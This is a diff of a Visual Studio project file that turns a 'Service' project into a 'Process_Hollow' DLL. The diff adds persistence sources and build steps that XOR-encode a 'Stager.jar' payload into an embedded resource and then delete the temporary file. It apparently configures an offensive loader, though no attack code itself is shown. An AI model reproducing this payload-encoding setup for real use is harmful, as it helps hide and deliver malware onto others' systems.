@@ -19,37 +19,40 @@
     </ProjectConfiguration>
   </ItemGroup>
   <PropertyGroup Label="Globals">
-    <ProjectGuid>{23431096-94FD-41CC-A560-CD61187305A1}</ProjectGuid>
-    <RootNamespace>Service</RootNamespace>
+    <ProjectGuid>{387676AB-C230-4C62-AB96-92749498DB32}</ProjectGuid>
+    <Keyword>Win32Proj</Keyword>
+    <RootNamespace>Process_Hollow</RootNamespace>
   </PropertyGroup>
   <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
   <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'" Label="Configuration">
-    <ConfigurationType>Application</ConfigurationType>
+    <ConfigurationType>DynamicLibrary</ConfigurationType>
     <UseDebugLibraries>true</UseDebugLibraries>
     <CharacterSet>MultiByte</CharacterSet>
     <PlatformToolset>v110</PlatformToolset>
+    <UseOfMfc>false</UseOfMfc>
   </PropertyGroup>
   <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'" Label="Configuration">
-    <ConfigurationType>Application</ConfigurationType>
+    <ConfigurationType>DynamicLibrary</ConfigurationType>
     <UseDebugLibraries>true</UseDebugLibraries>
     <CharacterSet>MultiByte</CharacterSet>
     <PlatformToolset>v110</PlatformToolset>
-    <UseOfMfc>Static</UseOfMfc>
+    <UseOfMfc>false</UseOfMfc>
   </PropertyGroup>
   <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'" Label="Configuration">
-    <ConfigurationType>Application</ConfigurationType>
+    <ConfigurationType>DynamicLibrary</ConfigurationType>
     <UseDebugLibraries>false</UseDebugLibraries>
     <WholeProgramOptimization>true</WholeProgramOptimization>
     <CharacterSet>MultiByte</CharacterSet>
+    <UseOfMfc>false</UseOfMfc>
     <PlatformToolset>v110</PlatformToolset>
   </PropertyGroup>
   <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="Configuration">
-    <ConfigurationType>Application</ConfigurationType>
+    <ConfigurationType>DynamicLibrary</ConfigurationType>
     <UseDebugLibraries>false</UseDebugLibraries>
     <WholeProgramOptimization>true</WholeProgramOptimization>
     <CharacterSet>MultiByte</CharacterSet>
+    <UseOfMfc>false</UseOfMfc>
     <PlatformToolset>v110</PlatformToolset>
-    <UseOfMfc>Static</UseOfMfc>
   </PropertyGroup>
   <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
   <ImportGroup Label="ExtensionSettings">
@@ -67,123 +70,171 @@
     <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
   </ImportGroup>
   <PropertyGroup Label="UserMacros" />
-  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
-    <GenerateManifest>false</GenerateManifest>
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
+    <LinkIncremental>true</LinkIncremental>
+    <EmbedManifest>false</EmbedManifest>
+    <OutDir>$(SolutionDir)dist\$(Platform)\$(Configuration)\</OutDir>
+    <IntDir>build\$(Platform)\$(Configuration)\</IntDir>
   </PropertyGroup>
   <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
-    <GenerateManifest>false</GenerateManifest>
+    <LinkIncremental>true</LinkIncremental>
+    <OutDir>$(SolutionDir)dist\$(Platform)\$(Configuration)\</OutDir>
+    <IntDir>build\$(Platform)\$(Configuration)\</IntDir>
   </PropertyGroup>
   <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
+    <LinkIncremental>false</LinkIncremental>
     <GenerateManifest>false</GenerateManifest>
+    <CustomBuildBeforeTargets>
+    </CustomBuildBeforeTargets>
+    <OutDir>$(SolutionDir)dist\$(Platform)\$(Configuration)\</OutDir>
+    <IntDir>build\$(Platform)\$(Configuration)\</IntDir>
+  </PropertyGroup>
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
+    <LinkIncremental>false</LinkIncremental>
+    <OutDir>$(SolutionDir)dist\$(Platform)\$(Configuration)\</OutDir>
+    <IntDir>build\$(Platform)\$(Configuration)\</IntDir>
   </PropertyGroup>
   <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
     <ClCompile>
+      <PrecompiledHeader>
+      </PrecompiledHeader>
       <WarningLevel>Level3</WarningLevel>
       <Optimization>Disabled</Optimization>
-      <PreprocessorDefinitions>_MBCS;_DBG;%(PreprocessorDefinitions)</PreprocessorDefinitions>
+      <PreprocessorDefinitions>_DBG</PreprocessorDefinitions>
+      <RuntimeLibrary>MultiThreaded</RuntimeLibrary>
+      <PrecompiledHeaderFile />
+      <PrecompiledHeaderOutputFile />
+      <AdditionalIncludeDirectories>..\include;..\..\util\include;%(AdditionalIncludeDirectories)</AdditionalIncludeDirectories>
     </ClCompile>
     <Link>
+      <SubSystem>NotSet</SubSystem>
       <GenerateDebugInformation>true</GenerateDebugInformation>
-      <SubSystem>Console</SubSystem>
     </Link>
-    <PreBuildEvent>
-      <Command>
-      </Command>
-    </PreBuildEvent>
+    <ResourceCompile>
+      <PreprocessorDefinitions>_DBG;_X86</PreprocessorDefinitions>
+      <AdditionalIncludeDirectories>..\resource;..\include</AdditionalIncludeDirectories>
+    </ResourceCompile>
     <PostBuildEvent>
-      <Command>
-      </Command>
+      <Command>del ..\..\Process_Hollow\resource\data.dat</Command>
     </PostBuildEvent>
+    <PreBuildEvent>
+      <Command>python.exe ..\..\util\script\rolling_xor.py  ..\..\Stager.jar  ..\..\Process_Hollow\resource\data.dat</Command>
+    </PreBuildEvent>
+    <Manifest>
+      <EnableDpiAwareness>false</EnableDpiAwareness>
+    </Manifest>
   </ItemDefinitionGroup>
   <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
     <ClCompile>
+      <PrecompiledHeader>
+      </PrecompiledHeader>
       <WarningLevel>Level3</WarningLevel>
       <Optimization>Disabled</Optimization>
-      <PreprocessorDefinitions>_MBCS;_DBG;%(PreprocessorDefinitions)</PreprocessorDefinitions>
+      <PreprocessorDefinitions>_DBG</PreprocessorDefinitions>
       <RuntimeLibrary>MultiThreaded</RuntimeLibrary>
+      <PrecompiledHeaderFile />
+      <PrecompiledHeaderOutputFile />
+      <AdditionalIncludeDirectories>..\include;..\..\util\include;%(AdditionalIncludeDirectories)</AdditionalIncludeDirectories>
     </ClCompile>
     <Link>
+      <SubSystem>Windows</SubSystem>
       <GenerateDebugInformation>true</GenerateDebugInformation>
-      <ManifestFile />
-      <EnableUAC>false</EnableUAC>
     </Link>
-    <PreBuildEvent>
-      <Command>
-      </Command>
-    </PreBuildEvent>
+    <ResourceCompile>
+      <PreprocessorDefinitions>_DBG;_X64</PreprocessorDefinitions>
+      <AdditionalIncludeDirectories>..\resource;..\include</AdditionalIncludeDirectories>
+    </ResourceCompile>
     <PostBuildEvent>
-      <Command>
-      </Command>
+      <Command>del ..\..\Process_Hollow\resource\data.dat</Command>
     </PostBuildEvent>
+    <PreBuildEvent>
+      <Command>python.exe ..\..\util\script\rolling_xor.py  ..\..\Stager.jar  ..\..\Process_Hollow\resource\data.dat</Command>
+    </PreBuildEvent>
   </ItemDefinitionGroup>
   <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
     <ClCompile>
       <WarningLevel>Level3</WarningLevel>
+      <PrecompiledHeader>
+      </PrecompiledHeader>
       <Optimization>MaxSpeed</Optimization>
       <FunctionLevelLinking>true</FunctionLevelLinking>
       <IntrinsicFunctions>true</IntrinsicFunctions>
-      <DebugInformationFormat>None</DebugInformationFormat>
-      <RuntimeLibrary>MultiThreaded</RuntimeLibrary>
+      <PreprocessorDefinitions>
+      </PreprocessorDefinitions>
       <ProgramDataBaseFileName />
+      <AdditionalIncludeDirectories>..\include;..\..\util\include;%(AdditionalIncludeDirectories)</AdditionalIncludeDirectories>
     </ClCompile>
     <Link>
+      <SubSystem>Windows</SubSystem>
       <GenerateDebugInformation>false</GenerateDebugInformation>
       <EnableCOMDATFolding>true</EnableCOMDATFolding>
       <OptimizeReferences>true</OptimizeReferences>
-      <ManifestFile />
+      <EnableUAC>false</EnableUAC>
+      <ProgramDatabaseFile />
     </Link>
-    <PreBuildEvent>
+    <ResourceCompile>
+      <PreprocessorDefinitions>_REL;_X86</PreprocessorDefinitions>
+      <AdditionalIncludeDirectories>..\resource;..\include</AdditionalIncludeDirectories>
+    </ResourceCompile>
+    <CustomBuildStep>
       <Command>
       </Command>
+    </CustomBuildStep>
+    <PreBuildEvent>
+      <Command>python.exe ..\..\util\script\rolling_xor.py  ..\..\Stager.jar  ..\..\Process_Hollow\resource\data.dat</Command>
     </PreBuildEvent>
     <PostBuildEvent>
-      <Command>
-      </Command>
+      <Command>del ..\..\Process_Hollow\resource\data.dat</Command>
     </PostBuildEvent>
   </ItemDefinitionGroup>
   <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
     <ClCompile>
       <WarningLevel>Level3</WarningLevel>
+      <PrecompiledHeader>
+      </PrecompiledHeader>
       <Optimization>MaxSpeed</Optimization>
       <FunctionLevelLinking>true</FunctionLevelLinking>
       <IntrinsicFunctions>true</IntrinsicFunctions>
+      <PreprocessorDefinitions>%(PreprocessorDefinitions)</PreprocessorDefinitions>
       <DebugInformationFormat>None</DebugInformationFormat>
+      <RuntimeLibrary>MultiThreaded</RuntimeLibrary>
+      <PrecompiledHeaderFile />
       <PrecompiledHeaderOutputFile />
-      <ProgramDataBaseFileName />
+      <AdditionalIncludeDirectories>..\include;..\..\util\include;%(AdditionalIncludeDirectories)</AdditionalIncludeDirectories>
     </ClCompile>
     <Link>
+      <SubSystem>Windows</SubSystem>
       <GenerateDebugInformation>false</GenerateDebugInformation>
       <EnableCOMDATFolding>true</EnableCOMDATFolding>
       <OptimizeReferences>true</OptimizeReferences>
-      <ManifestFile />
-      <AllowIsolation>false</AllowIsolation>
-      <EnableUAC>false</EnableUAC>
-      <UACExecutionLevel />
       <ProgramDatabaseFile />
     </Link>
-    <PreBuildEvent>
-      <Command>
-      </Command>
-    </PreBuildEvent>
+    <ResourceCompile>
+      <PreprocessorDefinitions>_REL;_X64</PreprocessorDefinitions>
+      <AdditionalIncludeDirectories>..\resource;..\include</AdditionalIncludeDirectories>
+    </ResourceCompile>
     <PostBuildEvent>
-      <Command>
-      </Command>
+      <Command>del ..\..\Process_Hollow\resource\data.dat</Command>
     </PostBuildEvent>
+    <PreBuildEvent>
+      <Command>python.exe ..\..\util\script\rolling_xor.py  ..\..\Stager.jar  ..\..\Process_Hollow\resource\data.dat</Command>
+    </PreBuildEvent>
   </ItemDefinitionGroup>
   <ItemGroup>
-    <ResourceCompile Include="svc.rc" />
+    <ClInclude Include="..\..\util\include\log.h" />
+    <ClInclude Include="..\..\util\include\persist.h" />
+    <ClInclude Include="..\..\util\include\utilities.h" />
+    <ClInclude Include="..\include\ph.h" />
+    <ClInclude Include="..\include\resource.h" />
   </ItemGroup>
   <ItemGroup>
-    <ClInclude Include="..\log.h" />
-    <ClInclude Include="..\utilities.h" />
-    <ClInclude Include="resource.h" />
-    <ClInclude Include="svc.h" />
+    <ResourceCompile Include="..\resource\ph.rc" />
   </ItemGroup>
   <ItemGroup>
-    <ClCompile Include="..\JAR_Loader\jarldr.cpp" />
-    <ClCompile Include="..\log.cpp" />
-    <ClCompile Include="..\utilities.cpp" />
-    <ClCompile Include="svc.cpp" />
+    <ClCompile Include="..\..\util\src\log.cpp" />
+    <ClCompile Include="..\..\util\src\persist.cpp" />
+    <ClCompile Include="..\..\util\src\utilities.cpp" />
+    <ClCompile Include="..\src\ph.cpp" />
   </ItemGroup>
   <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
   <ImportGroup Label="ExtensionTargets">
